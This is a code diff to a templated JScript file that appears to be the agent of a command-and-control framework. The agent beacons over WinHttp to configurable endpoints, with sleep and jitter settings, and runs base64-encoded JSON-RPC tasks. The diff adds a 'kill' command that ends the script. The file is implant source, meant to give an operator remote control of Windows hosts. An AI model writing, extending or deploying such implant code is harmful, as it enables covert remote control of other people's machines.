@@ -6,7 +6,6 @@ var sleep = {{ sleep }};
 var jitter = {{ jitter }};
 var endpoints = {{ endpoints }};
 
-
 function post(data){
   try {
     var winhttp = new ActiveXObject("WinHttp.WinHttpRequest.5.1");;
@@ -23,6 +22,10 @@ function post(data){
       WScript.Quit(1);
     }
   }
+}
+
+function kill(){
+    WScript.Quit(1);
 }
 
 {% include "jscript_functions/base64.js" %}
@@ -95,6 +98,9 @@ while (true) {
               if('set sleep' === name){
                   sleep = b64d(args[0]);
                   result = '["' + b64e('Changed sleep to ' + sleep + ' second(s)') + '","' + b64e(sleep) + '"]';
+              }
+              if('kill' === name){
+                kill();
               }
               batch_response = batch_response + '{"jsonrpc": "2.0", "result": ' + result  + ',"id":"' + id + '"},';
           } catch (e) {
